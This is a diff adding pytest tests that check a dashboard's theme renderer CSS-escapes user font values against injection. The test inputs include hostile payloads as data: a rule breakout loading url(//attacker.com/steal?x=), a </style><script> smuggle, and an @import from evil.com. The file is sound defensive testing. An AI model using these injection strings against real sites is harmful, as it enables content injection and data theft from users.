@@ -3572,6 +3572,441 @@ class TestThemeBootstrapCSS:
         # No baked literal values in the html,body rule.
         assert "#0a1628" not in css.split("html,body")[1]
 
+    # --- CSS-injection hardening (PR #80301) ---------------------------
+    # Values are escaped with CSS hex escapes before interpolation into the
+    # unquoted ``:root`` custom-property declarations.  ``_esc`` must
+    # neutralize every delimiter/markup character that could break out of a
+    # declaration (``;``), a rule (``{``/``}``), or the style block
+    # (``<``/``>`` → ``</style>``), while leaving legitimate values
+    # (normal quoted font stacks, hex colors, sizes) intact.
+
+    @staticmethod
+    def _theme_with(font_sans: str, base_size: str = "17px") -> dict:
+        """A minimal user-theme dict whose values flow through _esc()."""
+        return {
+            "name": "adversarial",
+            "label": "Adversarial",
+            "palette": {
+                "background": {"hex": "#0a0a0a"},
+                "midground": {"hex": "#e5e5e5"},
+            },
+            "typography": {
+                "fontSans": font_sans,
+                "baseSize": base_size,
+            },
+        }
+
+    @staticmethod
+    def _render_theme(tmp_path, monkeypatch, theme_dict):
+        import hermes_cli.web_server as web_server
+        monkeypatch.setenv("HERMES_HOME", str(tmp_path))
+        themes_dir = tmp_path / "dashboard-themes"
+        themes_dir.mkdir(exist_ok=True)
+        # Use a YAML block scalar (|-) for fontSans so quoted/embedded
+        # values ("Segoe UI", ...) survive parsing intact instead of being
+        # mangled by YAML quoting rules.
+        font_sans = theme_dict["typography"]["fontSans"]
+        (themes_dir / "adversarial.yaml").write_text(
+            "name: adversarial\n"
+            "label: Adversarial\n"
+            "palette:\n"
+            "  background:\n"
+            "    hex: \"#0a0a0a\"\n"
+            "  midground:\n"
+            "    hex: \"#e5e5e5\"\n"
+            "typography:\n"
+            f"  fontSans: |-\n"
+            + "".join(f"    {line}\n" for line in font_sans.splitlines()) +
+            f"  baseSize: {theme_dict['typography']['baseSize']}\n",
+            encoding="utf-8",
+        )
+        monkeypatch.setattr(
+            web_server, "load_config",
+            lambda: {"dashboard": {"theme": "adversarial"}},
+        )
+        return web_server._render_active_theme_bootstrap_css()
+
+    def test_esc_neutralizes_rule_breakout(self, tmp_path, monkeypatch):
+        """A value that could end a declaration/rule must not inject CSS."""
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with('Arial;} html{background:url(//attacker.com/steal?x=)}'),
+        )
+        # Precisely assert the escaped forms inside the --theme-font-sans
+        # value (not a weak ``or``), so a partial-escape regression — e.g.
+        # ``;`` escaped but ``}`` not, or vice-versa — fails loudly.
+        value = css.split("--theme-font-sans:")[1].split(";", 1)[0]
+        assert "\\3B " in value  # the injected ';' is CSS-escaped
+        assert "\\7D " in value  # the injected '}' is CSS-escaped
+        assert ";" not in value  # no live ';' survives inside the value
+        assert "}" not in value  # no live '}' survives inside the value
+        # The generated block must still terminate properly.
+        assert css.endswith("</style>")
+
+    def test_esc_neutralizes_literal_hex_escape(self, tmp_path, monkeypatch):
+        """Pin the escape ORDER: a literal ``\\3B `` must NOT decode to ``;``.
+
+        ``_esc`` doubles the backslash BEFORE inserting hex escapes. So:
+          * a real ``;`` becomes a SINGLE ``\\3B `` escape (one backslash), and
+          * a literal ``\\3B `` (backslash-3-B-space) in the value has its
+            backslash doubled to ``\\\\3B `` (two backslashes), which the CSS
+            parser reads as a literal backslash + ``3B `` — never the hex
+            escape that yields a live ``;``.
+
+        Asserting both cases together pins the ordering: if the backslash
+        escape ran AFTER the hex-insertion step, the real-``;`` case would
+        also be double-escaped and the single-backslash assertion would fail.
+        """
+        # Case A: a real ';' is escaped to a single \3B  (one backslash).
+        css_semicolon = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with("Arial;sans-serif"),
+        )
+        assert "Arial\\3B sans-serif" in css_semicolon
+        assert "Arial;" not in css_semicolon
+
+        # Case B: a literal '\3B ' must not decode to a live ';' — its
+        # backslash is doubled to \\3B  (two backslashes), staying inert text.
+        css_literal = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with("Arial\\3B position:fixed"),
+        )
+        assert "Arial\\\\3B position" in css_literal
+        assert "Arial;" not in css_literal
+
+        # The generated block still terminates properly in both cases.
+        assert css_semicolon.count("</style>") == 1
+        assert css_semicolon.count(":root{") == 1
+        assert css_literal.count("</style>") == 1
+        assert css_literal.count(":root{") == 1
+
+    def test_esc_escapes_quote_unbalanced_across_comment(self, tmp_path, monkeypatch):
+        """A quote inside a comment must not be misjudged as a string opener.
+
+        Regression for the Codex finding: in ``/*"*/"`` only the final ``"``
+        is a string opener (the first sits inside a ``/* … */`` comment). The
+        comment opener itself is escaped first (``/*`` -> ``\\2F *``), so the
+        remaining quotes are balanced and the value is safe — but the raw
+        ``/*`` must never survive to comment out the server's terminators.
+        """
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with('/*"*/"'),
+        )
+        value = css.split("--theme-font-sans:")[1].split(";", 1)[0]
+        # The comment opener is neutralized; no raw ``/*`` survives.
+        assert "/*" not in value
+        # The block still terminates properly with no breakout.
+        assert css.count("</style>") == 1
+        assert css.count(":root{") == 1
+        assert css.endswith("</style>")
+
+    def test_esc_escapes_quote_unbalanced_across_string_content(self, tmp_path, monkeypatch):
+        """Quote balance must treat ``/*`` inside a string as string content.
+
+        Regression for the Codex finding: in ``"/*"*/"`` the first ``"`` opens
+        a string, so the inner ``"`` and ``/*`` are string content and the
+        final ``"`` is a fresh unterminated string. Raw byte-counting sees
+        three quotes (odd) but a comment-only scanner also misses that the
+        second quote already closed the string — only a string-aware scan
+        counts the three genuine delimiters and escapes the quote type.
+        """
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with('"/*"*/"'),
+        )
+        value = css.split("--theme-font-sans:")[1].split(";", 1)[0]
+        # All string-opener quotes are escaped, so none is left to open a string.
+        assert '"' not in value
+        assert "\\22 " in value
+        # The block still terminates properly.
+        assert css.count("</style>") == 1
+        assert css.count(":root{") == 1
+
+    def test_esc_escapes_quote_left_open_by_mixed_quotes(self, tmp_path, monkeypatch):
+        """Escaping one quote type must not expose another as a raw opener.
+
+        Regression for the Codex finding: ``'"`` — if only the single quote
+        is escaped, the double quote that was string content becomes a raw
+        opening ``"`` and leaves an unterminated string. The post-transform
+        check must escape both quote types.
+        """
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with("'\""),
+        )
+        value = css.split("--theme-font-sans:")[1].split(";", 1)[0]
+        assert '"' not in value
+        assert "'" not in value
+        assert "\\22 " in value
+        assert "\\27 " in value
+        # The block still terminates properly.
+        assert css.count("</style>") == 1
+        assert css.count(":root{") == 1
+
+    def test_esc_escapes_quote_exposed_by_backslash_doubling(self, tmp_path, monkeypatch):
+        """Backslash-doubling must not turn an escaped quote into a closer.
+
+        Regression for the Codex finding: ``"foo\\"bar"`` is balanced before
+        transformation (the middle ``"`` is escaped by the backslash), but
+        doubling the backslash to ``\\\\`` makes that middle quote a real
+        closer and leaves the trailing ``"`` opening a fresh unterminated
+        string. The post-transform check must escape the exposed quote.
+        """
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with('"foo\\"bar"'),
+        )
+        value = css.split("--theme-font-sans:")[1].split(";", 1)[0]
+        # No raw quote delimiter survives to open a string.
+        assert '"' not in value
+        assert "\\22 " in value
+        # The block still terminates properly.
+        assert css.count("</style>") == 1
+        assert css.count(":root{") == 1
+
+    def test_esc_neutralizes_comment_opener(self, tmp_path, monkeypatch):
+        """A ``/*`` must not comment out the server's rule terminators.
+
+        Regression for the Codex finding: an intact ``/*`` would comment out
+        the ``;``/``}`` that terminate the server-generated declarations and
+        rule, dropping the rest of the style block. ``/*`` must be escaped to
+        ``\\2F *`` so no comment opener survives.
+        """
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with("Arial/*"),
+        )
+        value = css.split("--theme-font-sans:")[1].split(";", 1)[0]
+        assert "/*" not in value
+        assert "\\2F " in value
+        # The generated rule still terminates properly.
+        assert css.count(":root{") == 1
+        assert css.endswith("</style>")
+
+    def test_esc_strips_legitimate_comment_keeps_value_valid(self, tmp_path, monkeypatch):
+        """A well-formed ``/* … */`` comment is stripped, not left as junk.
+
+        Regression for the Codex finding: ``Arial/* note */, sans-serif`` must
+        not become invalid tokens (``Arial\\2F * note */, sans-serif``); the
+        complete comment is removed to whitespace so the font-family stays
+        valid, while an unterminated ``/*`` is still neutralized separately.
+        """
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with("Arial/* note */, sans-serif"),
+        )
+        value = css.split("--theme-font-sans:")[1].split(";", 1)[0]
+        # No comment marker survives.
+        assert "/*" not in value
+        assert "*/" not in value
+        # The surrounding family names remain usable.
+        assert "Arial" in value
+        assert "sans-serif" in value
+        # The complete comment is normalized to a single space, so the value
+        # stays a valid font-family list (exact normalized form).
+        assert "Arial , sans-serif" in value
+        # The generated rule still terminates properly.
+        assert css.count(":root{") == 1
+        assert css.endswith("</style>")
+
+    @pytest.mark.parametrize("value", ['"', "'", '\\"'])
+    def test_esc_escapes_lone_or_escaped_quote(self, tmp_path, monkeypatch, value):
+        """A lone or backslash-escaped quote must not open a string."""
+        css = self._render_theme(tmp_path, monkeypatch, self._theme_with(value))
+        v = css.split("--theme-font-sans:")[1].split(";", 1)[0]
+        # No raw quote delimiter survives to open an unterminated string.
+        assert '"' not in v
+        assert "'" not in v
+        # The generated rule still terminates properly.
+        assert css.count(":root{") == 1
+        assert css.endswith("</style>")
+
+    def test_esc_blocks_style_tag_smuggle(self, tmp_path, monkeypatch):
+        """Escaping ``<``/``>`` must guarantee no literal ``</style>``."""
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with('Arial;</style><script>alert(1)</script>'),
+        )
+        # The injected literal sequence must be gone.
+        assert "</style><script>" not in css
+        assert "<script>" not in css
+        # Only the server's own terminator may appear.
+        assert css.count("</style>") == 1
+
+    def test_esc_neutralizes_import_and_quotes(self, tmp_path, monkeypatch):
+        """Remote stylesheet import and quote-breakout attempts are escaped.
+
+        The hostile ``;``/``}`` delimiters must be CSS-escaped so the text
+        after them (``@import url(...)``) stays inside the current
+        declaration value and cannot terminate it or open a new rule.
+        """
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with('"Arial"};@import url(//evil.com/x.css);'),
+        )
+        # The `;` and `}` in the payload must be escaped, not literal.
+        assert "\\3B " in css
+        assert "\\7D " in css
+        # No injected rule may be produced: the block must still have
+        # exactly one :root rule, one html,body rule, and one </style>.
+        assert css.count("</style>") == 1
+        assert css.count(":root{") == 1
+        # The generated block must terminate properly (declaration closed
+        # only by the server's own terminators, never an injected one).
+        assert css.endswith("</style>")
+
+    def test_esc_escapes_interior_newline(self, tmp_path, monkeypatch):
+        """An actual interior newline in a theme value must be CSS-escaped.
+
+        Regression for the audit finding: the old fixture only had a literal
+        ``\\n`` and a chomped trailing newline, so it never exercised the
+        ``.replace("\\n", "\\A ")`` transform. Here we push a real newline
+        through the YAML block-scalar fixture and assert ``\\A `` appears.
+        """
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with("Arial\nBold, sans-serif"),
+        )
+        # The interior newline must be escaped to a CSS hex escape, never
+        # left as a raw line break inside the declaration.
+        assert "\\A " in css
+        # No unescaped newline may survive inside the :root declaration.
+        inner = css.split(":root{")[1].split("}html,body")[0]
+        assert "\n" not in inner
+        # The generated block must still terminate properly.
+        assert css.count("</style>") == 1
+        assert css.count(":root{") == 1
+
+    def test_esc_escapes_carriage_return(self, tmp_path, monkeypatch):
+        """A carriage return in a theme value must be escaped as ``\\D ``.
+
+        YAML block scalars normalize ``\\r`` to ``\\n``, so CR cannot be
+        exercised through the YAML fixture. We instead stub the theme source
+        to hand ``_esc`` a value that contains a real CR.
+        """
+        import hermes_cli.web_server as web_server
+        monkeypatch.setenv("HERMES_HOME", str(tmp_path))
+        theme_with_cr = {
+            "name": "adv",
+            "palette": {
+                "background": {"hex": "#0a0a0a"},
+                "midground": {"hex": "#e5e5e5"},
+            },
+            "typography": {"fontSans": "Arial\rBold, sans-serif", "baseSize": "17px"},
+        }
+        monkeypatch.setattr(web_server, "load_config", lambda: {"dashboard": {"theme": "adv"}})
+        monkeypatch.setattr(web_server, "_discover_user_themes", lambda: [theme_with_cr])
+        css = web_server._render_active_theme_bootstrap_css()
+        assert "\\D " in css
+        inner = css.split(":root{")[1].split("}html,body")[0]
+        assert "\r" not in inner
+        assert css.count("</style>") == 1
+
+    def test_esc_escapes_form_feed(self, tmp_path, monkeypatch):
+        """A form-feed (U+000C) must be escaped as ``\\C ``.
+
+        CSS preprocessing maps a form-feed to a newline, so an unescaped one
+        can terminate a string or act as whitespace. We stub the theme source
+        directly (as with CR) to hand ``_esc`` a real form-feed.
+        """
+        import hermes_cli.web_server as web_server
+        monkeypatch.setenv("HERMES_HOME", str(tmp_path))
+        theme_with_ff = {
+            "name": "ff",
+            "palette": {
+                "background": {"hex": "#0a0a0a"},
+                "midground": {"hex": "#e5e5e5"},
+            },
+            "typography": {"fontSans": "Arial\x0cBold, sans-serif", "baseSize": "17px"},
+        }
+        monkeypatch.setattr(web_server, "load_config", lambda: {"dashboard": {"theme": "ff"}})
+        monkeypatch.setattr(web_server, "_discover_user_themes", lambda: [theme_with_ff])
+        css = web_server._render_active_theme_bootstrap_css()
+        assert "\\C " in css
+        inner = css.split(":root{")[1].split("}html,body")[0]
+        assert "\x0c" not in inner
+        assert css.count("</style>") == 1
+
+    @pytest.mark.parametrize("esc", ["\\\n", "\\\r", "\\\r\n", "\\\f"])
+    def test_esc_keeps_escaped_newline_inside_string(self, tmp_path, monkeypatch, esc):
+        """An escaped newline stays inside a string, keeping quotes balanced.
+
+        CSS preprocessing maps a form-feed to a newline, so ``\\`` + LF / CR /
+        CRLF / FF is a single escaped newline that does NOT terminate the
+        string. The quote scan must recognise this so a quoted value containing
+        an escaped newline keeps its balanced quotes and never drops the rule.
+        """
+        import hermes_cli.web_server as web_server
+        monkeypatch.setenv("HERMES_HOME", str(tmp_path))
+        theme = {
+            "name": "t",
+            "palette": {"background": {"hex": "#0a0a0a"}, "midground": {"hex": "#e5e5e5"}},
+            "typography": {"fontSans": '"Arial' + esc + 'Bold", sans-serif', "baseSize": "17px"},
+        }
+        monkeypatch.setattr(web_server, "load_config", lambda: {"dashboard": {"theme": "t"}})
+        monkeypatch.setattr(web_server, "_discover_user_themes", lambda: [theme])
+        css = web_server._render_active_theme_bootstrap_css()
+        # The quoted string stays balanced (opening quote retained) and the
+        # generated rule terminates properly.
+        assert css.count(":root{") == 1
+        assert css.count("</style>") == 1
+        assert css.endswith("</style>")
+
+    def test_normal_quoted_font_stack_preserved(self, tmp_path, monkeypatch):
+        """Regression: a normal quoted font-family must keep its quotes and
+        resolve as intended (quotes must NOT be escaped, per codex audit)."""
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with('"Segoe UI", "Helvetica Neue", Arial, sans-serif'),
+        )
+        # Quotes survive so the CSS parser treats this as a quoted string
+        # token, not escaped identifiers.
+        assert '"Segoe UI"' in css
+        assert '"Helvetica Neue"' in css
+        # No escape sequences were applied to the quotes.
+        assert "\\22 " not in css
+        assert "\\27 " not in css
+
+    def test_normal_single_quote_family_preserved(self, tmp_path, monkeypatch):
+        """Regression: single-quoted family names also keep their quotes."""
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with("'Trebuchet MS', Arial, sans-serif"),
+        )
+        assert "'Trebuchet MS'" in css
+        assert "\\27 " not in css
+
+    def test_hex_and_size_passthrough(self, tmp_path, monkeypatch):
+        """Normal hex colors and sizes pass through unchanged."""
+        css = self._render_theme(
+            tmp_path, monkeypatch,
+            self._theme_with("Inter, sans-serif", "16px"),
+        )
+        assert "--theme-font-sans:Inter, sans-serif;" in css
+        assert "--theme-base-size:16px;" in css
+        assert "--background-base:#0a0a0a;" in css
+
+    def test_custom_css_passes_through_unescaped(self):
+        """Contract: user-authored ``customCSS`` ships raw, never escaped.
+
+        ``_normalise_theme_definition`` returns ``customCSS`` byte-for-byte as
+        authored (clipped only to ``_THEME_CUSTOM_CSS_MAX``); it is injected
+        as a scoped ``<style>`` tag at theme-apply time and is intentionally
+        NOT run through ``_esc``. The dashboard is localhost-only and themes
+        are trusted user-authored YAML (same trust as the ``~/.hermes``
+        config), so this is a deliberate contract. Pinning it here prevents a
+        future hardening change to ``_esc`` from silently sanitising
+        ``customCSS`` and breaking valid user stylesheets.
+        """
+        import hermes_cli.web_server as web_server
+        raw = 'body{background:url(//x)} h1::after{content:"</style>"}'
+        result = web_server._normalise_theme_definition(
+            {"name": "contract", "customCSS": raw}
+        )
+        assert result is not None
+        assert result["customCSS"] == raw
+
 
 
 
